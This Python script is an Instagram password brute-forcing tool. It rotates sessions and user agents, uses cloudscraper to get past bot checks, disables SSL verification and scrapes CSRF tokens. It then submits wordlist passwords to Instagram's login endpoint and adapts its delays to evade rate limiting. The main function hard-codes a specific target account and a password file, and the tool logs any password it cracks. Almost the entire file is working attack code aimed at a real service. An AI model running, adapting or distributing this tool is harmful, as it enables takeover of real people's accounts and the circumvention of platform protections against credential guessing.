#!/usr/bin/env python3
"""
Instagram Brute Force Script - Clean Working Version
Fixed all syntax errors and HTTP 400 issues
"""

import os
import sys
import time
import random
import requests
import json
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import socket
import urllib3
import itertools
import base64
import hashlib
from urllib.parse import quote
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None

try:
    import cloudscraper
except (ImportError, ModuleNotFoundError):
    cloudscraper = None
    print("⚠️  Cloudscraper module not available - install with pip install cloudscraper")

try:
    import asyncio
    import aiohttp
    import asyncssh
except ImportError:
    asyncio = aiohttp = asyncssh = None


class AdvancedInstagramBruteForcer:
    """Advanced Instagram Brute Force Attack Class - Industrial Grade"""

    def __init__(self, target_username, password_list, proxy_list=None, use_tor=False):
        self.target_username = target_username
        self.password_list = password_list
        # Disable proxy loading to avoid IPv6/PySocks issues
        self.proxy_list = [] if not proxy_list else proxy_list
        self.found_password = None
        self.use_tor = use_tor

        # User agent rotation
        if UserAgent:
            self.ua = UserAgent()
        else:
            self.ua = None

        # Advanced session creation
        if cloudscraper:
            self.scraper = cloudscraper.create_scraper()
        else:
            self.scraper = None

        # Session management
        self.sessions = []
        self.create_session_pool()
        self.rotate_sessions = True

        # Rate limiting and delays
        self.failed_attempts = 0
        self.last_request_time = 0
        self.dynamic_delay = 2.0
        self.max_delay = 120.0
        self.adaptive_delay_enabled = True

        # Advanced features
        self.smart_reordering = True
        self.session_rotation = True
        self.advanced_headers = True
        self.csrf_auto_refresh = True

        # Statistics
        self.total_attempts = 0
        self.start_time = None
        self.rate_limited_count = 0
        self.checkpoint_count = 0
        self.success_count = 0

    def create_session_pool(self, pool_size=5):
        """Create a pool of sessions for rotation"""
        print("🔄 Creating session pool...")
        self.sessions = []

        for i in range(pool_size):
            session = self.create_advanced_session()
            self.sessions.append(session)
            time.sleep(0.5)  # Small delay between session creation

        print(f"✅ Created {len(self.sessions)} sessions")

    def create_advanced_session(self):
        """Create an advanced session with proper configuration"""
        if self.scraper:
            session = cloudscraper.create_scraper()
        else:
            session = requests.Session()

        # Advanced retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )

        adapter = HTTPAdapter(max_retries=retry_strategy,
                              pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # Disable SSL warnings
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        session.verify = False

        return session

    def get_session(self):
        """Get a random session from pool"""
        if self.rotate_sessions and self.sessions:
            return random.choice(self.sessions)
        return self.sessions[0] if self.sessions else requests.Session()

    def get_advanced_headers(self, mode='web'):
        """Generate advanced headers that mimic real browser behavior"""
        if self.ua:
            user_agent = self.ua.random
        else:
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

        headers = {
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }

        if mode == 'web':
            headers.update({
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded',
            })

        return headers

    def get_csrf_token(self, session):
        """Extract CSRF token from Instagram login page"""
        try:
            headers = self.get_advanced_headers()
            response = session.get('https://www.instagram.com/accounts/login/',
                                   headers=headers, timeout=15)

            # Try multiple methods to extract CSRF token
            csrf_token = None

            # Method 1: From cookies
            if 'csrftoken' in session.cookies:
                csrf_token = session.cookies['csrftoken']

            # Method 2: From response text
            if not csrf_token:
                import re
                csrf_match = re.search(
                    r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)

            # Method 3: From meta tag
            if not csrf_token:
                csrf_match = re.search(
                    r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)

            return csrf_token

        except Exception as e:
            print(f"⚠️ CSRF token extraction failed: {e}")
            return None

    def validate_user_exists_quick(self, session):
        """Quick check if the user exists"""
        try:
            headers = self.get_advanced_headers()
            url = f'https://www.instagram.com/{self.target_username}/'

            response = session.get(url, headers=headers, timeout=10)

            if response.status_code == 200:
                # Check for user existence indicators
                if 'Sorry, this page isn\'t available' in response.text:
                    return False
                elif 'The link you followed may be broken' in response.text:
                    return False
                elif self.target_username in response.text:
                    return True
                else:
                    return None  # Uncertain
            else:
                print(
                    f"⚠️ User existence check failed with status {response.status_code}")
                return None
        except Exception as e:
            print(f"⚠️ Error checking user existence: {e}")
            return None

    def validate_user_exists_thorough(self, session):
        """More thorough check if the user exists"""
        try:
            # Try GraphQL API
            headers = self.get_advanced_headers('web')
            headers.update({
                'X-IG-App-ID': '936619743392459',
                'X-Instagram-AJAX': '1006179778'
            })

            url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target_username}'

            response = session.get(url, headers=headers, timeout=20)

            # Parse response
            try:
                data = response.json()
                if data.get('status') == 'ok' and data.get('data', {}).get('user'):
                    return True
                else:
                    return False
            except:
                # Try checking response text
                if 'The link you followed may be broken' in response.text:
                    return False
                elif 'isn\'t_username' in response.text:
                    return False
                elif 'This page' in response.text:
                    return True
                else:
                    print("Ambiguous user existence response, proceeding anyway")
                    return True

        except Exception as e:
            print(f"User existence check failed: {e}")
            # Return True to continue the attack
            return True

    def web_login(self, session, password, csrf_token):
        """Perform web-based login attempt with enhanced payload"""
        try:
            headers = self.get_advanced_headers('web')
            headers['X-CSRFToken'] = csrf_token
            headers['X-Instagram-AJAX'] = '1006179778'

            # Enhanced login payload based on 2025 Instagram API
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
                'stopDeletionNonce': '',
                'isFromLogin': 'true'
            }

            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=20,
                allow_redirects=False
            )

            return self.analyze_response(response, password, 'web')

        except Exception as e:
            print(f"🔥 Web login error for {password}: {e}")
            return False

    def analyze_response(self, response, password, method):
        """Analyze response for success, failure, or rate limiting"""
        try:
            status_code = response.status_code
            response_text = response.text.lower()

            # Success indicators
            success_indicators = [
                'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'
            ]

            # Rate limit indicators
            rate_limit_indicators = [
                'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'
            ]

            # Checkpoint indicators
            checkpoint_indicators = [
                'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'
            ]

            # Check for success
            if any(indicator in response_text for indicator in success_indicators):
                print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
                self.found_password = password
                return True

            # Check for rate limiting
            if any(indicator in response_text for indicator in rate_limit_indicators):
                print(f"⏳ [{method.upper()}] Rate limited for: {password}")
                self.rate_limited_count += 1
                return None

            # Check for checkpoint
            if any(indicator in response_text for indicator in checkpoint_indicators):
                print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
                self.checkpoint_count += 1
                return False

            # Regular failure
            print(f"❌ [{method.upper()}] Failed: {password}")
            return False

        except Exception as e:
            print(f"⚠️ Response analysis error: {e}")
            return False

    def adaptive_delay(self):
        """Implement adaptive delay based on response patterns"""
        if not self.adaptive_delay_enabled:
            return

        # Calculate delay based on failed attempts
        if self.failed_attempts > 10:
            self.dynamic_delay = min(self.dynamic_delay * 1.5, self.max_delay)
        elif self.rate_limited_count > 0:
            self.dynamic_delay = min(self.dynamic_delay * 2, self.max_delay)
        else:
            self.dynamic_delay = max(self.dynamic_delay * 0.9, 2.0)

        # Add random jitter
        jitter = random.uniform(0.5, 1.5)
        delay = self.dynamic_delay * jitter

        print(f"⏱️ Adaptive delay: {delay:.1f}s")
        time.sleep(delay)

    def attempt_login_secure(self, password, attempt_number):
        """Secure login attempt with all safety features"""
        try:
            # Get fresh session and CSRF token
            session = self.get_session()
            csrf_token = self.get_csrf_token(session)

            if not csrf_token:
                print(f"⚠️ Could not get CSRF token for: {password}")
                return False

            # Perform login attempt
            result = self.web_login(session, password, csrf_token)

            # Update statistics
            self.total_attempts += 1
            if result is False:
                self.failed_attempts += 1

            # Apply adaptive delay
            self.adaptive_delay()

            return result

        except Exception as e:
            print(f"⚠️ Secure login error for {password}: {e}")
            return False

    def smart_password_ordering(self):
        """Smart password ordering based on common patterns"""
        if not self.smart_reordering:
            return self.password_list

        # Prioritize common passwords
        priority_patterns = [
            lambda p: len(p) >= 8 and len(p) <= 12,  # Reasonable length
            lambda p: any(c.isdigit() for c in p),    # Contains numbers
            lambda p: any(c.isupper() for c in p),    # Contains uppercase
            lambda p: self.target_username.lower() in p.lower(),  # Contains username
        ]

        scored_passwords = []
        for password in self.password_list:
            score = sum(
                1 for pattern in priority_patterns if pattern(password))
            scored_passwords.append((score, password))

        # Sort by score (descending)
        scored_passwords.sort(key=lambda x: x[0], reverse=True)
        return [password for score, password in scored_passwords]

    def adjust_thread_count(self, max_threads):
        """Dynamically adjust thread count based on performance"""
        if self.rate_limited_count > 5:
            return max(1, max_threads // 2)
        return max_threads

    def print_progress_stats(self, attempt_number, start_time):
        """Print progress statistics"""
        elapsed = time.time() - start_time
        rate = attempt_number / elapsed if elapsed > 0 else 0

        print(f"\n📊 Progress: {attempt_number}/{len(self.password_list)} "
              f"| Rate: {rate:.1f}/s | Failed: {self.failed_attempts} "
              f"| Rate Limited: {self.rate_limited_count} | Checkpoints: {self.checkpoint_count}")

    def save_result(self, password, duration):
        """Save successful result to file"""
        try:
            result = {
                'target': self.target_username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'duration': duration,
                'attempts': self.total_attempts
            }

            os.makedirs('logs', exist_ok=True)
            with open('logs/successful_brute_force.json', 'a') as f:
                f.write(json.dumps(result) + '\n')

        except Exception as e:
            print(f"⚠️ Could not save result: {e}")

    def print_final_stats(self, duration):
        """Print final attack statistics"""
        print(f"\n📈 FINAL STATISTICS")
        print(f"Target: {self.target_username}")
        print(f"Total Attempts: {self.total_attempts}")
        print(f"Duration: {duration:.1f}s")
        print(f"Rate: {self.total_attempts/duration:.1f} attempts/s")
        print(f"Failed Attempts: {self.failed_attempts}")
        print(f"Rate Limited: {self.rate_limited_count}")
        print(f"Checkpoints: {self.checkpoint_count}")

    def run_smart_attack(self, password_list, smart_mode=True):
        """Run the brute force attack with smart features"""
        print(f"\n🎯 STARTING INSTAGRAM BRUTE FORCE ATTACK")
        print(f"Target: {self.target_username}")
        print(f"Passwords loaded: {len(password_list)}")
        print(f"Smart Mode: {'ON' if smart_mode else 'OFF'}")
        print("=" * 60)

        # Initial user existence check
        print("🔍 Checking if target user exists...")
        initial_session = self.get_session()

        # Apply smart password ordering if enabled
        if smart_mode:
            self.password_list = self.smart_password_ordering()

        # First check - faster but less reliable
        user_exists_quick = self.validate_user_exists_quick(initial_session)
        if user_exists_quick is False:  # Only if definitely False
            retry_session = self.get_session()
            # Second check - more thorough
            if not self.validate_user_exists_thorough(retry_session):
                user_choice = input(
                    f"❓ User {self.target_username} may not exist. Continue anyway? (y/N): ")
                if user_choice.lower() != 'y':
                    print("❌ Attack aborted")
                    return False
            else:
                print(
                    f"✅ Username {self.target_username} validated via thorough check")
        else:
            print(f"✅ Username validation passed or skipped due to uncertainty")

        # Start the actual attack
        start_time = time.time()
        self.start_time = start_time
        attempt_number = 0

        # Create logs directory
        os.makedirs('logs', exist_ok=True)

        print("\n🚀 Starting brute force attack...")

        for password in self.password_list:
            if self.found_password:
                print(f"\n🎉 TERMINATING - PASSWORD FOUND!")
                break

            result = self.attempt_login_secure(password, attempt_number)
            attempt_number += 1

            # Progress reporting
            if attempt_number % 10 == 0:
                self.print_progress_stats(attempt_number, start_time)

            # Check for success
            if result is True:
                break

        # Final results
        end_time = time.time()
        duration = end_time - start_time

        if self.found_password:
            print(f"\n🎉 SUCCESS! Password found: {self.found_password}")
            self.save_result(self.found_password, duration)
        else:
            print(
                f"\n❌ Attack completed. No password found after {attempt_number} attempts")

        self.print_final_stats(duration)
        return self.found_password


def main():
    """Main function for standalone execution"""
    print("🔥 Instagram Brute Force Tool - Clean Version")

    # Default settings
    target_username = "alx.trading"
    password_file = "/workspaces/sugarglitch-realops/passwords.txt"

    # Load passwords
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(passwords)} passwords")
    except FileNotFoundError:
        print(f"❌ Password file not found: {password_file}")
        return

    # Create brute forcer
    bf = AdvancedInstagramBruteForcer(
        target_username=target_username,
        password_list=passwords
    )

    # Run attack
    result = bf.run_smart_attack(passwords, smart_mode=True)

    if result:
        print(f"\n🎉 Attack successful! Password: {result}")
    else:
        print(f"\n❌ Attack completed without success")


if __name__ == "__main__":
    main()
